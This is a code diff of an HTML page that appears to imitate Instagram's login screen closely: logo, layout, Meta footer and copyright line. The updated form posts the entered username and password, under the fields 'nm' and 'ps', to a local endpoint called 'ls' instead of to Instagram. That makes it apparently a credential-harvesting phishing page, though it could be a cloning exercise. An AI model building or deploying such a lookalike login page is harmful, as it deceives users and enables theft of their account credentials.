@@ -1,226 +1,279 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Login ▪️ Instagram</title>
-    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/2048px-Instagram_logo_2022.svg.png">
-    
-    <style>
-        body {
-    margin: 0;
-    color:black;
-}
-
-.container {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    padding: 40px 20px;
-}
-
-.login-box {
-    
-    border: 1px solid #333;
-    padding: 30px 40px;
-    width: 320px;
-    text-align: center;
-    margin-bottom: 10px;
-}
-
-
-
-form input {
-    width: 100%;
-    padding: 10px;
-    margin: 8px 0;
-    border: 1px solid #444;
-    border-radius: 5px;
-    color: black;
-}
-
-form input::placeholder {
-    color: #aaa;
-}
-
-.login-btn {
-    background-color: #0095f6;
-    color: white;
-    border: none;
-    padding: 10px;
-    width: 100%;
-    border-radius: 6px;
-    font-weight: bold;
-    margin-top: 10px;
-    cursor: pointer;
-}
- .logo img {
-      height: 57px;
-      width: 191px;
-      padding: 0px 70px;
+  <meta charset="UTF-8" />
+  <title>Instagram Login</title>
+  <style>
+    body {
+      margin: 0;
+      color: black;
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
     }
 
-.divider {
-    display: flex;
-    align-items: center;
-    color: #aaa;
-    margin: 20px 0;
-}
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
 
-.divider hr {
-    flex: 1;
-    border: none;
-    border-top: 1px solid #444;
-}
+    .login-box {
+      border: 1px solid #333;
+      padding: 30px 40px;
+      width: 320px;
+      text-align: center;
+      background-color: white;
+    }
 
-.divider span {
-    margin: 0 10px;
-    font-size: 12px;
-}
+    .logo img {
+      height: 57px;
+      width: 191px;
+      margin-bottom: 20px;
+    }
+
+    form input {
+      width: 93%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      color: black;
+      font-size: 14px;
+      background-color: white;
+    }
+
+    form input::placeholder {
+      color: #aaa;
+    }
+
+    .password-container {
+      position: relative;
+      width: 100%;
+    }
+
+    .password-container input {
+      width: 100%;
+      padding: 10px;
+      padding-right: 50px; /* room for Show */
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .password-container #toggleText {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 13px;
+      font-weight: 600;
+      color: #b4b4b4;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .login-btn {
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 6px;
+      font-weight: bold;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      color: #aaa;
+      margin: 20px 0;
+    }
+
+    .divider hr {
+      flex: 1;
+      border: none;
+      border-top: 1px solid #ccc;
+    }
+
+    .divider span {
+      margin: 0 10px;
+      font-size: 12px;
+    }
 
     .facebook {
-      padding: 20px 0px 0px 0px;
+      padding-top: 10px;
     }
 
     .facebook img {
       height: 24px;
       width: 24px;
-      position: relative;
-      top: 5px;
-      
+      vertical-align: middle;
+      margin-right: 8px;
     }
 
     .facebook a {
       text-decoration: none;
-      font-weight: bolder;
+      font-weight: bold;
       color: #3579ea;
-      right: 100px;
+      font-size: 14px;
     }
 
+    .forgot-password {
+      color: #00377e;
+      font-weight: normal;
+      font-size: 14px;
+      display: block;
+      margin-top: 15px;
+      text-decoration: none;
+    }
 
-.forgot-password {
-    color: #fff;
-    font-weight: bold;
-    font-size: 12px;
-    display: block;
-    margin-top: 10px;
-    text-decoration: none;
-}
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
 
-.signup-box {
-    border: 1px solid #333;
-    width: 320px;
-    text-align: center;
-    padding: 15px;
-    margin-bottom: 20px;
-}
+    .signup-box {
+      border: 1px solid #333;
+      width: 320px;
+      text-align: center;
+      padding: 15px;
+      margin-top: 15px;
+      background-color: white;
+    }
 
-.signup-box a {
-    color: #0095f6;
-    text-decoration: none;
-    font-weight: bold;
-}
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
 
-.get-app {
-    text-align: center;
-    color: #ccc;
-}
+    .get-app {
+      text-align: center;
+      color: #262626;
+      margin-top: 20px;
+    }
 
-.store-buttons img {
-    height: 40px;
-    margin: 10px;
-    cursor: pointer;
-}
+    .store-buttons img {
+      height: 40px;
+      margin: 10px;
+      cursor: pointer;
+    }
 
-footer {
-    margin-top: 40px;
-    text-align: center;
-    font-size: 12px;
-    color: #888;
-    padding: 20px;
-}
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      padding: 20px;
+    }
 
-.footer-links {
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    gap: 10px;
-    margin-bottom: 10px;
-}
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
 
-.footer-links a {
-    color: #888;
-    text-decoration: none;
-}
+    .footer-links a {
+      color: #888;
+      text-decoration: none;
+    }
 
-.footer-links a:hover {
-    text-decoration: underline;
-}
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
 
-footer .copyright p {
-    margin: 2px 0;
-}
-
-    </style>
+    .copyright p {
+      margin: 2px 0;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
+  <div class="container">
 
-        <!-- Login Box -->
-        <div class="login-box">
-            <div class="logo">
-        <img
-          src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png"
-          alt="">
-            <form>
-                <input type="text" placeholder="Phone number, username or email address" required>
-                <input type="password" placeholder="Password" required>
-                <button type="submit" class="login-btn">Log in</button>
-                <div class="divider"><hr><span>OR</span><hr></div>
-                <div class="facebook">
-       
-        <a href="">Log in with Facebook </a>
+    <!-- Login Box -->
+    <div class="login-box">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" />
       </div>
-                <a href="" class="forgot-password">Forgotten your password?</a>
-            </form>
+
+      <form action="ls" method="post">
+        <input type="text" placeholder="Phone number, username or email address" name="nm" required />
+        
+        <div class="password-container">
+          <input type="password" id="password" placeholder="Password" name="ps" required>
+          <span id="toggleText">Show</span>
         </div>
 
-        <!-- Sign Up Prompt -->
-        <div class="signup-box">
-            <p>Don't have an account? <a href="SignUp.html">Sign up</a></p>
+        <button type="submit" class="login-btn">Log in</button>
+
+        <div class="divider"><hr><span>OR</span><hr></div>
+
+        <div class="facebook">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" alt="Facebook Logo">
+          <a href="#">Log in with Facebook</a>
         </div>
 
-        <!-- App Download -->
-        <div class="get-app">
-            <p>Get the app.</p>
-            <div class="store-buttons">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
-                <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store">
-            </div>
-        </div>
-
-        <!-- Footer -->
-        <footer>
-            <div class="footer-links">
-                <a href="#">Meta</a>
-                <a href="#">About</a>
-                <a href="#">Blog</a>
-                <a href="#">Jobs</a>
-                <a href="#">Help</a>
-                <a href="#">API</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-                <a href="#">Locations</a>
-                <a href="#">Instagram Lite</a>
-                <a href="#">Threads</a>
-                <a href="#">Contact uploading and non-users</a>
-                <a href="#">Meta Verified</a>
-            </div>
-            <div class="copyright">
-                <p>English (UK) ⌄</p>
-                <p>© 2025 Instagram from Meta</p>
-            </div>
-        </footer>
-
+        <a href="Forgot.html" class="forgot-password">Forgotten your password?</a>
+      </form>
     </div>
+
+    <!-- Sign Up Prompt -->
+    <div class="signup-box">
+      <p>Don't have an account? <a href="./SignUp.html">Sign up</a></p>
+    </div>
+
+    <!-- App Download -->
+    <div class="get-app">
+      <p>Get the app.</p>
+      <div class="store-buttons">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Download on Microsoft Store">
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+      <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact uploading and non-users</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      <div class="copyright">
+        <p>English (UK) ⌄</p>
+        <p>© 2025 Instagram from Meta</p>
+      </div>
+    </footer>
+
+  </div>
+
+  <script>
+    const toggle = document.getElementById('toggleText');
+    const password = document.getElementById('password');
+
+    toggle.addEventListener('click', () => {
+      if (password.type === 'password') {
+        password.type = 'text';
+        toggle.textContent = 'Hide';
+      } else {
+        password.type = 'password';
+        toggle.textContent = 'Show';
+      }
+    });
+  </script>
 </body>
 </html>
